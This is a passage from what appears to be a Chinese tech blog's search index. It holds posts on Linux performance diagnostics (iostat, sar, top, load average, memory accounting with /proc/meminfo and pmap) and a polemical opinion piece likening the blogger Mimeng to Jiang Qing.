0.23 5.62 1.78 0.03[...] 这是一个理解块设备（磁盘）极好的工具，不论是负载评估还是作为性能测试成绩。 r/s, w/s, rkB/s, wkB/s: 这些是该设备每秒读％、写％、读Kb、写Kb。可用于描述工作负荷。一个性能问题可能只是简单地由于一个过量的负载引起。 await: I/O平均时间（毫秒）这是应用程序需要的时间，它包括排队以及运行的时间。远远大于预期的平均时间可以作为设备饱和，或者设备问题的指标。 avgqu­sz: 向设备发出的平均请求数。值大于1可视为饱和（尽管设备能对请求持续运行，特别是前端的虚拟设备－后端有多个磁盘）。 %util: 设备利用率这是一个实时的繁忙的百分比，显示设备每秒钟正在进行的工作。值大于60%属于典型的性能不足（可以从await处查看），尽管它取决于设备。值接近100% 通常指示饱和。￼￼如果存储设备是一个前端逻辑磁盘、后挂一堆磁盘，那么100%的利用率也许意味着，一些已经处理的I/O此时占用100%，然而，后端的磁盘也许远远没有达到饱和，其实可以承担更多的工作。 切记：磁盘I/O性能低并不一定是应用程序问题。许多技术一贯使用异步I/O，所以应用程序并不会阻塞，以及遭受直接的延迟（例如提前加载，缓冲写入）。 7. free m12345$ free -mtotal used free shared buffers cachedMem: 245998 24545 221453 83 59 541-/+ buffers/cache: 23944 222053Swap: 0 0 0 buffers: buffer cache,用于块设备I/O。cached:page cache, 用于文件系统。￼ ￼我们只是想检查这些指标值不为0——那样意味着磁盘I/O高、性能差（确认需要用iostat）。上面的例子看起来不错，每一类内存都有富余。 “­/+ buffers/cache”: 提供了关于内存利用率更加准确的数值。 Linux可以将空闲内存用于缓存，并且在应用程序需要的时候收回。所以应用到缓存的内存必须以另一种方式包括在内存空闲的数据里面。有一个网站linux ate my ram,专门探讨这个困惑。它还有更令人困惑的地方，如果在Linux上使用ZFS,正如我们运行一些服务，ZFS拥有自己的文件系统缓存，也不能在free -m 的输出里正确反映。这种情况会显示系统空闲内存不足，但是内存实际上可用，通过回收 ZFS 的缓存。 关于 Linux 内存管理的更多内容，可以阅读操作系统原理：How Linux Works (Memroy)。 8. sar n DEV 11234567891011$ sar -n DEV 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)12:16:48 AM IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s %ifutil12:16:49 AM eth0 18763.00 5032.00 20686.42 478.30 0.00 0.00 0.00 0.0012:16:49 AM lo 14.00 14.00 1.36 1.36 0.00 0.00 0.00 0.0012:16:49 AM docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0012:16:49 AM IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s %ifutil12:16:50 AM eth0 19763.00 5101.00 21999.10 482.56 0.00 0.00 0.00 0.0012:16:50 AM lo 20.00 20.00 3.25 3.25 0.00 0.00 0.00 0.0012:16:50 AM docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00^C 使用这个工具用来检查网络接口吞吐量：rxkB/s 和 txkB/s, 作为负载的一种度量方式, 也可以用来检查是否已经达到某种瓶颈。 在上面的例子中，网卡 eth0 收包大道 22 Mbytes/s, 即176 Mbits/sec (就是说，在 1 Gbit/sec 的限制之内)。此版本也有一个体现设备利用率的 “％ifutil” （两个方向最大值），我们也可以使用 Brendan的nicstat 工具来度量。和 nicstat 类似，这个值很难准确获取，看起来在这个例子中并没有起作用（0.00）。 9. sar n TCP,ETCP 11234567891011$ sar -n TCP,ETCP 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)12:17:19 AM active/s passive/s iseg/s oseg/s12:17:20 AM 1.00 0.00 10233.00 18846.0012:17:19 AM atmptf/s estres/s retrans/s isegerr/s orsts/s12:17:20 AM 0.00 0.00 0.00 0.00 0.0012:17:20 AM active/s passive/s iseg/s oseg/s12:17:21 AM 1.00 0.00 8359.00 6039.0012:17:20 AM atmptf/s estres/s retrans/s isegerr/s orsts/s12:17:21 AM 0.00 0.00 0.00 0.00 0.00^C 这是一个关键TCP指标的概览视图。包括：active/s: 本地初始化的 TCP 连接数 ／每秒（例如，通过connect() ）passive/s: 远程初始化的 TCP 连接数／每秒（例如，通过accept() ）retrans/s: TCP重发数／每秒 这些活跃和被动的计数器常常作为一种粗略的服务负载度量方式：新收到的连接数 (被动的),以及下行流量的连接数 (活跃的)。这也许能帮助我们理解，活跃的都是外向的，被动的都是内向的，但是严格来说这种说法是不准确的（例如，考虑到“本地－本地”的连接）。重发数是网络或服务器问题的一个标志；它也许是因为不可靠的网络（如，公共互联网），也许是由于一台服务器已经超负荷、发生丢包。上面的例子显示每秒钟仅有一个新的TCP连接。 10. top123456789101112131415161718$ toptop - 00:15:40 up 21:56, 1 user, load average: 31.09, 29.87, 29.92Tasks: 871 total, 1 running, 868 sleeping, 0 stopped, 2 zombie%Cpu(s): 96.8 us, 0.4 sy, 0.0 ni, 2.7 id, 0.1 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem: 25190241+total, 24921688 used, 22698073+free, 60448 buffersKiB Swap: 0 total, 0 used, 0 free. 554208 cached MemPID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND20248 root 20 0 0.227t 0.012t 18748 S 3090 5.2 29812:58 java4213 root 20 0 2722544 64640 44232 S 23.5 0.0 233:35.37 mesos-slave66128 titancl+ 20 0 24344 2332 1172 R 1.0 0.0 0:00.07 top5235 root 20 0 38.227g 547004 49996 S 0.7 0.2 2:02.74 java4299 root 20 0 20.015g 2.682g 16836 S 0.3 1.1 33:14.42 java1 root 20 0 33620 2920 1496 S 0.0 0.0 0:03.82 init2 root 20 0 0 0 0 S 0.0 0.0 0:00.02 kthreadd3 root 20 0 0 0 0 S 0.0 0.0 0:05.35 ksoftirqd/05 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/0:0H6 root 20 0 0 0 0 S 0.0 0.0 0:06.94 kworker/u256:08 root 20 0 0 0 0 S 0.0 0.0 2:38.05 rcu_sched top命令包含了许多我们之前已经检查的指标。它可以非常方便地运行，看看是否任何东西看起来与从前面的命令的结果完全不同，可以表明负载指标是不断变化的。顶部下面的输出，很难按照时间推移的模式查看，可能使用如 vmstat 和 pidstat 等工具会更清晰，它们提供滚动输出。如果你保持输出的动作不够快 （CtrlS 要暂停，CtrlQ 继续），屏幕将清除，间歇性问题的证据也会丢失。 总结故障检查过程中，人的作用主要是作出决策。遗忘、遗漏、麻痹、松懈是每个人都会犯的错误，好的公司都会根据经验编制检查单，提高工作效率，降低人为失误发生的概率。出于竞争因素考虑，应该充分重视检查单的更新、完善、自动化，以此为基础建立自己的技术壁垒。 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 Netflix Technology Blog:Linux Performance Analysis in 60,000 Milliseconds 从《清单革命》看飞行检查单]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断:负载评估]]></title>
    <url>%2F2017%2F12%2F11%2FLinux-Perf-Load%2F</url>
    <content type="text"><![CDATA[摘要 基于 Linux 单机的负载评估 负载诊断流程 概念：什么是负载 负载：CPU 还是 I/O Linux 内核进程调度器 概要：负载诊断流程 观察load average (平均负载) 观察CPU、I/O是否存在瓶颈 从load avgerage等总括性的数据着手，参考CPU使用率和I/O等待时间等具体的数字，从而自顶向下快速排查各进程状态。 概念：什么是负载?负载可以分为两大部分：CPU负载、I/O 负载 。 load average123uptimetopcat /proc/loadavg 1234567load average:0.65, 1.49, 1.76 （负载很低）load average:3.49, 3.67, 3.75 （负载一般）load average:33.20, 18.39, 15.21 (负载高)load average:70.25, 80.50, 95.38 (负载非常高，需要干预)load average:7.89, 11.42, 13.42 (当前负载趋于下降)load average:17.89, 13.28, 4.45 (当前负载趋于上升) 依次时过去1分钟，5分钟，15分钟内，单位时间的等待任务数，也就是表示平均有多少任务正处于等待状态。在load average较高的情况下，就说明等待运行的任务较多，因此轮到该任务运行的等待时间就会出现较大延迟，即反映了此时负载较高。 Linux 内核进程调度器（Process Scheduler）负责决定任务运行的优先级，以及让任务等待或使之重新开始等核心工作。调度器划分并管理进程（Process）的状态。例如： 等待分配CPU资源的状态 等待磁盘输入输出完毕的状态 进程描述符的状态 进程状态 PS Stat 说明 TASK_RUNNING R(Run) 运行状态。只要CPU空闲，随时都可以开始。 TASK_INTERRUPTIBLE S(Sleep) 可中断的等待状态。例如系统睡眠或来自于用户输入的等待等。 TASK_UNINTERRUPTIBLE D(Disk Sleep) 不可中断的等待状态。主要为短时间恢复时的等待状态。例如磁盘输入输出的等待 TASK_STOPPED 响应暂停信号而运行中断的状态。直到恢复（Resume）前都不会被调度 TASK_ZOMBIE Z(Zombie) 僵死状态。虽然子进程已经终止（exit）,但父进程尚未执行wait(),因此该进程的资源没有被系统释放 TASK_RUNNING正在运行 TASK_RUNNING （等待状态，加权换算） TASK_INTERRUPTIBLE（等待状态，加权换算） TASK_UNINTERRUPTIBLE（等待状态，不加权换算） load average 表示“等待进程的平均数”，除了“TASK_RUNNING正在运行”，其它三个都是等待状态。TASK_INTERRUPTIBLE不被换算。即只换算“虽然需要即刻运行处理，但是无论如何都必须等待”。 load average所描述的负载就是：需要运行处理，但又必需等待队列前的进程处理完成的进程个数。具体来说：要么等待授予CPU运行权限，要么等待磁盘I/O完成。 内核函数：kernei/timer.c的calc-load(); 调用周期：每次计时器中断（centos为4ms） CPU 还是 I/O ?load average的数字只是表示等待的任务数，仅根据load average并不能判断具体是CPU负载高还是I/O负载高。 CPU密集型程序 I/O密集型程序 Sar (System Activity Reporter)CPU使用率和I/O等待时间都是在不断变化的，可以通过sar 命令来确认这些指标。该工具包含在sysstat软件包内。 123456789101112$ sarLinux 04/17/16 _x86\_64_ (24 CPU)00:00:01 CPU %user %nice %system %iowait %steal %idle00:10:02 all 1.26 0.00 0.55 0.00 0.00 98.1900:20:01 all 1.58 0.00 1.04 0.00 0.00 97.3800:30:01 all 1.23 0.00 0.56 0.00 0.00 98.2100:40:01 all 1.59 0.00 1.01 0.00 0.00 97.4000:50:01 all 1.35 0.00 0.59 0.00 0.00 98.0601:00:01 all 1.63 0.00 1.10 0.00 0.00 97.2701:10:01 all 1.22 0.00 0.54 0.00 0.00 98.2401:20:01 all 1.68 0.00 1.06 0.00 0.00 97.2501:30:01 all 1.23 0.00 0.54 0.00 0.00 98.23 123456789101112$ sar 1 1018:54:58 %usr %sys %wio %idle18:54:59 18 3 0 7918:55:00 46 14 0 4018:55:01 38 13 0 4918:55:02 17 4 0 7918:55:03 11 4 0 8518:55:04 12 5 0 8318:55:05 20 4 0 7618:55:06 22 3 0 7518:55:07 21 4 0 7518:55:08 17 4 0 79 输出参数: %user:用户(一般的应用软件运作模式)CPU资源 %system:系统（内核运作）占用CPU资源 %iowait:I/O等待率。 进程详细1234567891011$ ps auxwtest 1551 0.2 0.1 6452 4776 ? S 19:25 0:00 Test.pl CTP00004.PRS00034 1 300test 1553 2.6 0.4 18196 16424 ? S 19:25 0:00 /Test.pl 00001.PRS00034test 1555 2.6 0.4 18168 16396 ? S 19:25 0:00 /Test.pl 00002.PRS00034test 1557 2.8 0.4 18132 16432 ? S 19:25 0:00 /Test.pl 00004.PRS00034test 1606 0.0 0.0 50060 916 ? Sl 19:25 0:00 /bin/PingTest -f CTP00004test 1612 2.5 0.4 18156 16452 ? S 19:25 0:00 /Test.pl 00014.PRS00034test 1629 2.1 0.4 18416 16696 ? S 19:25 0:00 /Test.pl 00015.PRS00034test 2253 2.7 0.3 12868 11160 ? R 19:25 0:00 -w mrtg MRTG\_00027.cfg logtest 2254 3.6 0.3 12864 11184 ? S 19:25 0:00 -w mrtg MRTG\_00028.cfg logtest 2261 2.4 0.2 12640 11004 ? S 19:25 0:00 -w mrtg MRTG\_00030.cfg log 输出参数： %CPU：该进程的CPU使用率 %memb：物理内存百分比 VSZ、RSS：虚拟／物理内存 STAT：进程状态（非常重要） TIME：CPU占用时间 SWAP吞吐1234567891011121314$sar -W17:20:01 pswpin/s pswpout/s17:30:01 0.00 0.0017:40:01 0.00 0.0017:50:01 0.00 0.0018:00:01 0.00 0.0018:10:01 0.00 0.0018:20:01 0.00 0.0018:30:01 0.00 0.0018:40:01 0.00 0.0018:50:02 0.00 0.0019:00:01 0.00 0.0019:10:02 0.00 0.00Average: 0.00 0.00 输出参数： pswpin/s:每秒系统换入的页面数 pswpout/s:每秒系统换出的页面数 发生频繁的交换时，服务器的吞吐量性能会大幅下降。 vmstat(Report Virtual Memory Statistics)实时确认CPU使用率及实际的I/O等待时间1234$ vmstat kthr memory page disk faults cpu r b w swap free re mf pi po fr de sr s2 s2 s2 s2 in sy cs us sy id 0 0 0 45411448 17973032 140 1470 13 41 33 0 0 -0 -0 -0 -0 2753 313459 4984 16 3 81 解决方案优化的真正工作是“找出系统瓶颈并加以解决”，我们所能做的就是“充分发挥硬／软件本来的性能，解决可能存在的问题”。例如，同样是I/O问题，我们可以通过增加内存来缓解，也可以调整调度方案来优化（时间换空间），但是更多的情况是，优化应用程序的I/O算法效果更佳。 最后，重温一句经典格言 别臆断，请监控 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux参考文献]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统原理:How Linux Works(三):Memory]]></title>
    <url>%2F2017%2F12%2F11%2FLinux-Works-Memory%2F</url>
    <content type="text"><![CDATA[摘要 经典内存异常：Out of Memory (OOM) Killer 我的内存利用率为什么特别高？ Linux 内存的分类 Linux 内存的计算 Linux 进程的内存 Linux 应用内存分配 内存是计算机中与CPU进行沟通的桥梁，用于暂时存放CPU中的运算数据。Linux 内核的内存管理机制设计得非常精妙，对于 Linux 内核的性能有很大影响。在早期的 Unix 系统中，fork 启动新进程时，由于从父进程往子进程复制内存信息需要消耗一定的时间，因此启动多个进程时存在性能瓶颈。现在的 Linux 内核则通过“写时复制（copy-on-write）”等机制提高了创建进程的效率；也正是因为这个原因，关于 Linux 内存分配、计算、空闲判断有一些特别的地方需要注意。 内存异常： Out of Memory (OOM) Killer12$ dmesg | tail[1880957.563400] Out of memory: Kill process 18694 (perl) score 246 or sacrifice child 最常见的内存管理异常就是 Out of memory 问题。通常是因为某个应用程序大量请求内存导致系统内存不足造成的，触发 Linux 内核里的 Out of Memory (OOM) killer，OOM killer 会杀掉某个进程以释放内存留给系统内核用。它实际上算一种保护机制，不致于让系统立刻崩溃，有些壮士断腕的意思。 内核检测到内存利用不足，就会选择并杀掉某个“bad”进程。如何判断和选择一个 “bad” 进程呢? 算法和思路其实非常朴素（简单）：最 bad 的那个进程就是那个占用内存最多的进程。内核源代码详见 linux/mm/oom_kill.c 。 我的内存利用率为什么特别高？ 内存利用率（概括）: free 内存利用率（进程）: top 123内存空闲率 = (Total - Used) / Total = (7982M - 7503M) / 7983M X 100 % = 6 %“真实的” 内存空闲率 = (free + shared + buffers + cached)/ Total = 5860 M / 7983M X 100 % = 73.4 % 实际情况是系统运行正常、不存在内存不足的情况，对于应用程序来说，“真实的” 内存空闲率是 73.4% 。如果要回答这个问题，必须了解内存管理的基础 —— 物理地址空间和逻辑地址空间。 按照用途，内存可以划分为“内核内存”和“用户内存”（用户进程及磁盘高速缓存），包括内核本身在内，程序在访问物理内存时，并不直接指定物理地址，而是指定逻辑地址。CPU 上搭载的硬件 MMU （Memory Management Unit）会参照物理-逻辑地址对应关系表实现对映射后物理地址上的数据访问。x86 架构中逻辑地址空间限制在 4GB ，在 x86_64 架构中则没有此限制。 Linux 内存的分类用户内存的分类有两组概念比较重要：匿名内存和File-backed内存；Active 和 Inactive 。它们的区别如下： 匿名内存：用来存储用户进程计算过程中间的数据，与物理磁盘的文件没有关系； File-backed内存：用作磁盘高速缓存，其物理内存与物理磁盘上的文件是对应的； Active : 刚被使用过的数据的内存空间； Inactive : 包含有长时间未被使用过的数据的内存空间； Shmem（shared memory）指的就是 tmpfs 所使用的内存 —— 一个基于内存的文件系统，提供可以接近零延迟的快速存储区域。Linux 可以将空闲内存用于缓存，并且在应用程序需要的时候收回。“­/+ buffers/cache”: 提供了关于内存利用率更加准确的数值。buffers: buffer cache,用于块设备I/O ; cached: page cache, 用于文件系统。例如： 12345678# free total used free shared buff/cache availableMem: 1012720 168756 23576 52024 820388 754520Swap: 262140 88 262052# mkdir /mnt/ramdisk# mount -t tmpfs -o size=512m tmpfs /mnt/ramdisk# vi /etc/fstab# tmpfs /mnt/ramdisk tmpfs nodev,nosuid,noexec,nodiratime,size=1024M 0 0 内存利用率（详细）：cat /proc/meminfo 123456789101112131415161718192021222324252627282930313233343536373839404142$ cat /proc/meminfoMemTotal: 8174352 kBMemFree: 376952 kBBuffers: 527412 kBCached: 5178924 kBSwapCached: 60 kBActive: 3061760 kBInactive: 4066588 kBActive(anon): 1112780 kBInactive(anon): 314156 kBActive(file): 1948980 kBInactive(file): 3752432 kBUnevictable: 6724 kBMlocked: 6724 kBSwapTotal: 16779884 kBSwapFree: 16777400 kBDirty: 376 kBWriteback: 0 kBAnonPages: 1428844 kBMapped: 64632 kBShmem: 644 kBSlab: 557384 kBSReclaimable: 338272 kBSUnreclaim: 219112 kBKernelStack: 4024 kBPageTables: 12440 kBNFS_Unstable: 0 kBBounce: 0 kBWritebackTmp: 0 kBCommitLimit: 20867060 kBCommitted_AS: 2406484 kBVmallocTotal: 34359738367 kBVmallocUsed: 111536 kBVmallocChunk: 34359455060 kBHugePages_Total: 0HugePages_Free: 0HugePages_Rsvd: 0HugePages_Surp: 0Hugepagesize: 2048 kBDirectMap4k: 6384 kBDirectMap2M: 2080768 kBDirectMap1G: 6291456 kB Linux 内存的计算各类内存的计算公式如下： Shmem = 磁盘高速缓存（buffers/cached）- Filed-backed内存（file） = 匿名内存（anon）- AnonPages用户内存 = Active(file) + Inactive(file) + Active(anon) + Inactive(anon) + Unevictable = buffers + cached + AnonPages 内核内存 = Memtotal - (MemFree + Active + Inactive + Unevictable) 12345678910111213141516171819202122$ cat /proc/meminfo | grep ActiveActive: 3065880 kBActive(anon): 1116748 kBActive(file): 1949132 kB-bash-4.3$-bash-4.3$-bash-4.3$ cat /proc/meminfo | grep InActive-bash-4.3$-bash-4.3$ cat /proc/meminfo | grep InactiveInactive: 4067224 kBInactive(anon): 314156 kBInactive(file): 3753068 kB-bash-4.3$-bash-4.3$-bash-4.3$ cat /proc/meminfo | grep anonActive(anon): 1120720 kBInactive(anon): 314156 kB-bash-4.3$-bash-4.3$ cat /proc/meminfo | grep fileActive(file): 1949236 kBInactive(file): 3753096 kB-bash-4.3$ Linux 进程的内存123456-bash-4.3$ ps -e -o 'pid,comm,args,pcpu,rsz,vsz,stime,user,uid' | grep slview | sort -nrk530029 java /slview/jdk150/jdk1.5.0_06/ 2.5 1337496 2678836 Dec07 slview 5432231574 bash -bash 0.0 2028 70592 17:08 slview 5432223398 crond crond 0.0 1688 102180 16:10 slview 54322 1123 crond crond 0.0 1688 102180 Dec10 slview 5432228252 crond crond 0.0 1596 102028 16:45 slview 54322 执行“ps aux” 后输出的各进程的 RSS (resident set size), 表示进程占用内存的大小，单位是KB。 需要注意的是，RSS 值实际上是基于 pmap 命令，表示“该进程正在使用的物理内存的总和”。pmap 提供了进程的内存映射，也可以支持多个进程的内存状态显示（pmap pid1 pid2 pid3）。与 ldd 命令类似，pmap 命令可以查看到程序调用的路径。如果查看一个已经运行，但是又不知道程序路径的程序，使用pmap更快捷。 123456789101112131415161718192021222324$ pmap -x 3002930029: /slview/jdk150/jdk1.5.0_06/bin/java -com.apache.TestAddress Kbytes RSS Dirty Mode Mapping0000000008048000 60 48 0 r-x-- java0000000008057000 8 8 8 rwx-- java0000000009f1d000 23184 23140 23140 rwx-- [ anon ]000000004d1f1000 108 96 0 r-x-- ld-2.5.so000000004d20c000 4 4 4 r-x-- ld-2.5.so000000004d20d000 4 4 4 rwx-- ld-2.5.so000000004d214000 1356 548 0 r-x-- libc-2.5.so000000004d367000 8 8 8 r-x-- libc-2.5.so00007f581e51d000 16 16 0 r--s- huanan-product-2.6.1-snapshots.jar00007f581e521000 24 24 0 r--s- dt.jar00007f581e527000 36 36 0 r--s- gnome-java-bridge.jar00007f581e530000 32 32 8 rw-s- 1322800007f581e538000 4 4 4 rw--- [ anon ]00007f581e539000 4 4 0 r---- [ anon ]00007f581e53a000 8 8 8 rw--- [ anon ]00007fffe9eb7000 84 32 32 rw--- [ stack ]00007fffe9fff000 4 4 0 r-x-- [ anon ]ffffffffff600000 4 0 0 r-x-- [ anon ](部分省略)---------------- ------ ------ ------total kB 2484196 36180 26880 /proc/PID/status 支持的选项有： VmData: data段大小 VmExe: text段大小 Vmlib: 共享库的使用量 VmRSS: 物理内存使用量 VmSwap: 交换空间的使用量 1234567891011121314151617181920212223242526272829303132333435363738$ cat /proc/30029/statusName: javaState: S (sleeping)Tgid: 30029Pid: 30029PPid: 29983TracerPid: 0Uid: 54322 54322 54322 54322Gid: 54323 54323 54323 54323FDSize: 8192Groups: 10 54323VmPeak: 2754032 kBVmSize: 2678836 kBVmLck: 0 kBVmHWM: 1337912 kBVmRSS: 1337512 kBVmData: 2575692 kBVmStk: 1012 kBVmExe: 60 kBVmLib: 101564 kBVmPTE: 3048 kBThreads: 98SigQ: 0/63825SigPnd: 0000000000000000ShdPnd: 0000000000000000SigBlk: 0000000000000004SigIgn: 0000000000000001SigCgt: 1000000180005cceCapInh: 0000000000000000CapPrm: 0000000000000000CapEff: 0000000000000000CapBnd: ffffffffffffffffCpus_allowed: ffffffffCpus_allowed_list: 0-31Mems_allowed: 00000000,Mems_allowed_list: 0voluntary_ctxt_switches: 12468nonvoluntary_ctxt_switches: 19 Linux 应用内存分配 类似 Java 之类的虚拟机应用程序可以设置内存参数，例如:Xms128m JVM初始分配的堆内存Xmx512m JVM最大允许分配的堆内存XX:PermSize=64M JVM初始分配的非堆内存XX:MaxPermSize=128M JVM最大允许分配的非堆内存 如果该应用需要较大的内存空间，可以调整为 -Xmx1024m、-Xmx2048m 以保障应用程序的运行性能，XX:MaxPermSize 设置过小会导致内存溢出，java.lang.OutOfMemoryError: PermGen space。但是 需要特别注意 的是：Xmx 绝对不能超过最大物理内存，或者说需要保留一定的剩余内存空间，否则将有可能导致其它进程因为没有可用内存而阻塞，甚至无法登陆机器 。 正如摔跤游戏一样，内存管理的法则就是让进程在 留有余地 的前提下搏杀。 进阶阅读 How The Kernel Manages Your Memory Anatomy of a Program in Memory Getting Physical With Memory Go Memory Management 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 linux内存分配与回收 Linux Ate my RAM 理解和配置 Linux 下的 OOM Killer |@vpsee 图解JAVA多线程 LINUX类主机JAVA应用程序占用CPU、内存过高分析手段 | 2015-12-04 丁启良 DBAplus社群 JVM源码分析之一个Java进程究竟能创建多少线程 | 原创 2016-12-06 寒泉子 你假笨]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[政府行为模型及预测：女权主义与政治运动]]></title>
    <url>%2F2017%2F12%2F09%2FPolicy-Female%2F</url>
    <content type="text"><![CDATA[摘要 真假女权主义：从江青到咪蒙 要有勇气运用你自己的理智！，这就是启蒙运动的口号。—— 康德 真假女权主义：从江青到咪蒙最近有一个概念火了：关咪比。即微信好友中关注咪蒙的比例。 咪蒙号称已经突破1000万粉丝。（另据腾讯科技内部人士透露，咪蒙的公众号真实粉丝数只有500万，就姑且算作500-1000万量级吧）。现在她的广告位报价是50万元起步、普通助理月薪5万起步。 这位具备爆炸传播力的现象级大 V 写的都是些什么呢？其中《致贱人》一篇，在短短三日之内，文章的阅读数据超350万，最前排的评论也得到了超过2万个赞。 《致贱人：我凭什么要帮你？！》 《致low逼：不是我太高调，而是你玻璃心》 《你看不上我？好巧，我也是》 《冒昧地问一下，你有钱回家过年吗？》 《识！食！物！者！为！俊！杰！》 《老子就是喜欢五！仁！月！饼！》 光看这些标题是不是就有种酣畅淋漓的快感！在这个苦大仇深的世界，你每天被迫与贱人或Low逼周旋，这时天降咪蒙勇士，帮你上去吐了一口唾沫、把贱人、LOW逼通通打倒、再踩在两脚，之后你宛如站在道德的高地上，是否已经感觉到那种复仇的欣快感？ 当然，有时也会变换一下套餐，呈现出“小鸟依人”的跪舔姿态，只不过这些情话充斥的是对高富帅“男神”的性幻想，绝不会考虑Low逼。我不得不说，她很能精准地拿捏人性的弱点。 《我很忙，但对你永远有空》 《“正室要像小三一样活着”》 《我们的爱情，是睡出来的》 《她83岁还有性生活，你呢？》 《所谓爱你，就是一日，三餐》 以咪蒙为代表的这批所谓新媒体，是一个全新的事物吗？有段时间我也一度非常迷惑，直到在野史杂记中找到一些线索：在私下里，江青经常自称老娘，叶群则一般自称姑奶奶。是不是感觉和咪蒙的语言风格很像呢？ 咪蒙，真名马凌。本硕毕业于山东大学中文系。江青，原名李云鹤。太祖武皇帝夫人。早年求学于私立青岛大学。叶群，原名叶静宜。国军将门之后，毕业于北京师范大学附属中学。 即使以今天的标准来看，这批人都算接受过良好教育的人士，相对一般社会成员的平均教育水平来说要高的多。有意思的是，私立青岛大学即今天山东大学的前身，江青和咪蒙可以说是隔代校友了。我相信，她们也曾经是文艺清新的女青年、时代新女性的代表，怎么讲出来的话、写出来的文字更像是《水浒传》里的孙二娘呢？ “通过一场革命或许可以实现推翻个人专制以及贪婪心和权势欲的压迫，但却决不能实现思想方式的真正变革。而新的偏见也正如镜子一样，将会成为驾驭缺少思想的广大人群的圈套。” —— 康德 江青、叶群可以娴熟地引用马恩列斯毛的理论教条，也可以一边享受豪华奢靡的生活，同时脱口而出江湖绿林、山寨夫人的语言系统。一场革命能办得到推翻个人专制或一种压迫，但是它绝对“不能实现思想方式的政治改革”，革命不是一个人思想改造如何如何，而是一个社会怎么样。而咪蒙的火爆，也不过是说出了这个时代很多人的心声罢了。 专制主义对社会、对人性的腐败是全面地，不仅将男人太监化，也将女人嫔妾化。太监化的问题以后在详细讨论，可以肯定的是，宫廷太监和嫔妾二者除了在追求权力和享受方面共通之外，真实的语言系统和行为方式也同样的肤浅、丑陋和恶毒。 判断一个人是不是新女性（好像没有听说过新男性），不能只看她是否有光鲜靓丽的履历，也不能只看她是否打着女权主义的现代口号，而更需要分析她（他）的真实品味，特别是在私人场合的语言系统，在不设防心理状态下得真实反应。 “到了基层就是要真刀真枪、就是要刺刀见红、就是要敢于硬碰硬、就是要解决问题。” —— 协办大学士、直隶总督兼提督九门步军巡捕五营统领·蔡 扩展阅读 数据可视化（十）公共数据源列表 参考文献]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（七）Graphite 体系结构详解]]></title>
    <url>%2F2017%2F12%2F04%2FVisualization-Graphite%2F</url>
